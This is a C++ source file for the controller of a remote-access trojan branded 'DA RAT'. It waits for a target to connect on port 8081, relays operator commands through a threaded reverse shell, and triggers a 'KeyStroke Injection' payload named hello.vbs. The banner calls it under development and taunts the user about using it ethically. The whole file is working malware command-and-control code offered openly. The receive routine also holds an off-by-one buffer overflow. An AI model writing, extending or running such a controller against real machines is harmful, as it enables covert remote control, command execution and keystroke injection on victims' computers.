//compile ->  cl /EHsc server.cpp /link ws2_32.lib /OUT:server.exe
#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <tuple>
#include <atomic>

using namespace std;

#define MAX_IP_LENGTH 16
#define MAX_TEXT_LENGTH 256

int argc_global;
char **argv_global;
SOCKET listenSocket;
SOCKET clientSocket;
bool targetconnected = false;

char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
char os;

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int socket_setup();
string get_client_ip(SOCKET clientSocket);

void send_data(SOCKET clientSocket, const string &data);
void send_data(SOCKET clientSocket, int data);
string receive_data(SOCKET clientSocket);

void os_detection();
bool getdata_from_file();
int Get_menu_option();

int Rev_Shell();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void safe_closesocket(SOCKET& s) 
{
    if (s != INVALID_SOCKET) {
        shutdown(s, SD_BOTH); // Prevent further sends/receives
        closesocket(s);
        s = INVALID_SOCKET; // Set to INVALID_SOCKET to prevent double closing
    }
}

int main(int argc, char *argv[]) 
{
    argc_global = argc;
    argv_global = argv;
    
    if (socket_setup() != 0) return 1;
    
    bool loop = true;
    while(loop)
    {
        switch (Get_menu_option())
        {
            case 1:                                                                         //connect
            {   
                if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
                {
                    std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
                    safe_closesocket(listenSocket); // Use safe_closesocket here
                    WSACleanup();
                    return 1;
                }               

                cout << "\n>> Waiting for incoming connections..." << endl;
                clientSocket = accept(listenSocket, nullptr, nullptr);
                
                if(get_client_ip(clientSocket) == "127.0.0.1")
                {   
                    cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
                    targetconnected = true;
                }
                else 
                {
                    cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
                    closesocket(clientSocket);
                }
                system("pause");
                break;
            }
            
            case 2:                                                                     //Rev shell
            {
                if (targetconnected && clientSocket != INVALID_SOCKET) 
                {
                    send_data(clientSocket, 2);
                    cout << ">> Sent " << endl;
                } else
                {
                    cout << ">> Target not connected or socket invalid!!" << endl;
                    system("pause");
                }
                
                Rev_Shell();

                break;
            }
            
            case 3:                                                                     //Execute keylogger
            {
                if (targetconnected && clientSocket != INVALID_SOCKET) { // VERY IMPORTANT CHECK
                    send_data(clientSocket, 3);
                    send_data(clientSocket, "hello.vbs");
                    cout << ">> Sent " << endl;
                } else {
                    cout << ">> Target not connected or socket invalid!!" << endl;
                }
                system("pause");
                break;
            }
            case 99:                                                                    //DC Current target
            {
                if (targetconnected) {
                    send_data(clientSocket, 99); // Inform the client (important!)
                    safe_closesocket(clientSocket);
                    safe_closesocket(listenSocket);
                    targetconnected = false;

                    if (socket_setup() != 0) {
                    return 1; // Handle socket setup error
                    }

                    cout << ">> Disconnecting client..." << endl << endl;
                } 
                else 
                {
                    cout << ">> No client connected to disconnect." << endl;
                }
                system("pause");
                break;
            }
            case 11:                                                                    //DC Current target and stop its code execution
            {
                if (targetconnected) {
                    send_data(clientSocket, 11); // Inform the client (important!)
                    safe_closesocket(clientSocket);
                    targetconnected = false;
                    cout << ">> Disconnecting client and requesting stop..." << endl << endl;
                } else {
                    cout << ">> No client connected to disconnect." << endl;
                }
                system("pause");
                break;
            }
            case 0:                                                                     //Exit console
            {
                //send_data(clientSocket,99);
                safe_closesocket(clientSocket);
                safe_closesocket(listenSocket);

                WSACleanup();
                cout << ">> Exiting..." << endl << endl;
                loop = false;
                break;
            }
            default:
            {

                cout << ">> Invalid option ( -_- )" << endl << endl;
                system("pause");
                break;
            }
        }
    }   

    return 0;
}

int socket_setup()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "socket failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8081);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    int reuse = 1;
    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
        std::cerr << "setsockopt failed with error: " << WSAGetLastError() << std::endl;
        safe_closesocket(listenSocket); // Use safe_closesocket here
        WSACleanup();
        return 1;
    }

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "bind failed with error: " << WSAGetLastError() << std::endl;
        safe_closesocket(listenSocket); // Use safe_closesocket here
        WSACleanup();
        return 1;
    }

    return 0;

}

void send_data(SOCKET clientSocket, const string &data)                                         // Doesnot send special data 
{
    int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
    if (bytesSent == SOCKET_ERROR) cerr << "Send failed with error: " << WSAGetLastError() << endl;
}

void send_data(SOCKET clientSocket, int data)
{
    // Convert the integer to a byte stream
    int bytesSent = send(clientSocket, reinterpret_cast<const char*>(&data), sizeof(data), 0);
    if (bytesSent == SOCKET_ERROR) 
    {
        cerr << "Send failed with error: " << WSAGetLastError() << endl;
    }
}

string receive_data(SOCKET clientSocket)
{
    char buffer[1024];                                                                           // Buffer to store received data
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

    if (bytesReceived > 0)
    {
        buffer[bytesReceived] = '\0';                                                           // Null-terminate the string
        string receivedData(buffer);                                                            // Store the data in a string
        return receivedData;
    }
    else if (bytesReceived == 0) cerr << "Connection closed by server." << std::endl;
    else cerr << "Receive failed with error: " << WSAGetLastError() << std::endl;

    return "";                                                                                  // Return an empty string in case of error or connection closure
}

void os_detection()
{
    #if defined(_WIN32) || defined(_WIN64)
        os = 'W';
    #elif defined(__linux__)
        os = 'L';
    #elif defined(__APPLE__) || defined(__MACH__)
        os = 'M';
    #elif defined(__unix__) || defined(__unix)
        os = 'U';
    #endif
}

bool getdata_from_file()
{
    FILE *sourceFile;
    const char *fileName = NULL;


    if (argc_global < 3) return false;

    if (strcmp(argv_global[1], "-f") == 0) fileName = argv_global[2];
    else return false;


    sourceFile = fopen(fileName, "r");
    if (sourceFile == NULL)
    {
        perror("\n\n\t|||||| Failed to open file ||||||\n\n");
        return false;
    }


    while (fscanf(sourceFile, "%15s", ipAddress) == 1)                                                // Read the IP address
    {        
        fgetc(sourceFile);                                                                            // Consume the newline character left by fscanf
        if (fgets(randomText, MAX_TEXT_LENGTH, sourceFile) != NULL)                                   // Read the random text
        {
            randomText[strcspn(randomText, "\n")] = '\0';                                             // Remove the newline character if it exists in randomText
        }
    }

    fclose(sourceFile);

    return true;
}

int Rev_Shell()
{
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    atomic<bool> processFinished(false);
    
    auto readThread = std::thread([&]()
    {
        while (!processFinished.load())
        {
            string data = receive_data(clientSocket);
            if (data.empty()) break;                                                            // Client has disconnected or there was an error
            cout << data;
            Sleep(10);                                                                          // Sleep for a short time to prevent 100% CPU usage
        }
    });

    auto writeThread = std::thread([&]()
    {
        string cmd;
        while (!processFinished.load())                                                                     
        {
            if (getline(cin, cmd))                                                              //getline to allow multi-word commands
            {
                if (cmd == "exit")
                {
                    send_data(clientSocket, "exit");
                    processFinished.store(true);
                    break;
                }
                send_data(clientSocket, cmd);
            }
            Sleep(10);
        }
    });

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    // Wait for process threads to finish
    readThread.join();
    writeThread.join();
    processFinished.store(true);

    return 0;
}

int Get_menu_option()
{
    int option = 0;

    system("cls");
    cout << R"(


                                  :::::::::      :::           :::::::::      ::: ::::::::::: 
                                 :+:    :+:   :+: :+:         :+:    :+:   :+: :+:   :+:      
                                +:+    +:+  +:+   +:+        +:+    +:+  +:+   +:+  +:+       
                               +#+    +:+ +#++:++#++:       +#++:++#:  +#++:++#++: +#+        
                              +#+    +#+ +#+     +#+       +#+    +#+ +#+     +#+ +#+         
                             #+#    #+# #+#     #+#       #+#    #+# #+#     #+# #+#          
                            #########  ###     ###       ###    ### ###     ### ###           

                                            [::] Made By Oorth :) [::]              
                                    
                                    [::] Use this Ethically, if you dont [::]
                                        [::] I'll just enjoy watching  [::]

                                            [::] UNDER DEVELOPMENT!! [::]
          
                            _________________________________________________________
                                                
                                                [::] Menu :) [::]

                                    Connect a target                        1)";
    
    if(!targetconnected) cout << "  [-]\n";
    else cout << "  [o]\n";

    cout << R"(
                                    Rev Shell                               2
                                    KeyStroke Injection                     3
                                                                            )";            
                                    
    if(targetconnected)cout << R"(
                                    Disconnect Current Target              [99]
                                    DC target & stop its code              {11}
                                                                            )";

    cout << R"(
                                    Exit                                    0)";

    cout << "\n\n>> ";
    cin >> option;

    if(cin.fail())
    {
        cin.clear();
        cout << ">> INT Bro, Int ( -_- )" << endl << endl;
        system("pause");
    }


    return option;

}

string get_client_ip(SOCKET clientSocket)
{
    sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    if (getpeername(clientSocket, (sockaddr*)&clientAddr, &clientAddrLen) == SOCKET_ERROR) {
        cerr << "getpeername failed." << endl;
        return "";
    }

    // Convert IP address to string
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    return string(clientIP);
}